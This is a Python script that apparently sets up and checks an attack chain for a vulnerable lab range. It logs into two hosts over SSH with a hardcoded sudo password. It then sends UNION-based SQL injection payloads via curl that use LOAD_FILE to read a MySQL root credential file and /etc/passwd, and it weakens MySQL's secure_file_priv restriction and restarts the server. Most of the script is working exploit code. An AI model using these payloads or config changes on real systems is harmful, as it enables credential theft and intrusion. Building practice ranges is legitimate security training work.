#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fix A-4 LOAD_FILE chain: copy root.cnf to mysql-files dir, check secure_file_priv"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

# ============================================================
# 1. Check secure_file_priv via SQLi
# ============================================================
print("="*60)
print("1. CHECK secure_file_priv VIA SQLi")
print("="*60)
payload = "test%27%20UNION%20SELECT%201,@@secure_file_priv,3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Also check @@datadir
payload2 = "test%27%20UNION%20SELECT%201,@@datadir,3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload2}' 2>&1")

# ============================================================
# 2. Copy root.cnf to secure_file_priv dir on A2
# ============================================================
print("\n" + "="*60)
print("2. FIX LOAD_FILE PATH")
print("="*60)

# Check what directories exist
run(c2, "ls -la /var/lib/mysql-files/ 2>/dev/null || echo 'NO_MYSQL_FILES'")
run(c2, "echo 'Gdadmin@123' | sudo -S ls -la /var/lib/mysql-files/ 2>&1")

# Copy root.cnf there
run(c2, "echo 'Gdadmin@123' | sudo -S cp /etc/mysql/mysql.conf.d/root.cnf /var/lib/mysql-files/root.cnf 2>&1; echo COPY_EXIT:$?")
run(c2, "echo 'Gdadmin@123' | sudo -S chmod 644 /var/lib/mysql-files/root.cnf 2>&1; echo CHMOD_EXIT:$?")
run(c2, "echo 'Gdadmin@123' | sudo -S ls -la /var/lib/mysql-files/")

# ============================================================
# 3. Test LOAD_FILE with new path
# ============================================================
print("\n" + "="*60)
print("3. TEST LOAD_FILE WITH MYSQL-FILES PATH")
print("="*60)

import codecs
path = '/var/lib/mysql-files/root.cnf'
hex_path = '0x' + codecs.encode(path.encode(), 'hex').decode()
print(f"Hex path: {hex_path}")

payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Also test with the original /etc path to confirm it still fails
path2 = '/etc/mysql/mysql.conf.d/root.cnf'
hex_path2 = '0x' + codecs.encode(path2.encode(), 'hex').decode()
payload_orig = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path2}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload_orig}' 2>&1")

# ============================================================
# 4. Also try modifying MySQL secure_file_priv to allow /etc
# ============================================================
print("\n" + "="*60)
print("4. ALTERNATIVE: RELAX secure_file_priv")
print("="*60)
# Check if we can read the my.cnf to see the config
run(c2, "echo 'Gdadmin@123' | sudo -S grep -n 'secure_file_priv' /etc/mysql/mysql.conf.d/mysqld.cnf 2>&1")

# If not set, it might be NULL (allow all) or /var/lib/mysql-files/ (default)
# Let's try setting it to empty (allow all)
run(c2, "echo 'Gdadmin@123' | sudo -S bash -c \"echo 'secure_file_priv = \\\"\\\"' >> /etc/mysql/mysql.conf.d/mysqld.cnf\" 2>&1; echo SET_EXIT:$?")
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl restart mysql 2>&1; echo RESTART_EXIT:$?")

# ============================================================
# 5. Test LOAD_FILE after MySQL restart
# ============================================================
print("\n" + "="*60)
print("5. TEST LOAD_FILE AFTER RELAX")
print("="*60)

# Wait for MySQL restart
run(c2, "sleep 3; echo OK")

# Test with original path
payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path2}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test with /etc/passwd
path3 = '/etc/passwd'
hex_path3 = '0x' + codecs.encode(path3.encode(), 'hex').decode()
payload3 = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path3}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload3}' 2>&1")

# ============================================================
# 6. Verify whole A chain
# ============================================================
print("\n" + "="*60)
print("6. A-CHAIN SUMMARY")
print("="*60)
print("A-1 ✅ /backup/ autoindex")
print("A-2 ✅ SQLi via /api.php/search")
print("A-3 ✅ /config/database.php source leak")
print("A-4 ? LOAD_FILE root.cnf → MySQL root password")
print("A-5 ? UEditor upload")
print("A-6 ? sudo find")

# Check @@secure_file_priv now
payload = "test%27%20UNION%20SELECT%201,@@secure_file_priv,3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

c1.close()
c2.close()
print("\nDone!")
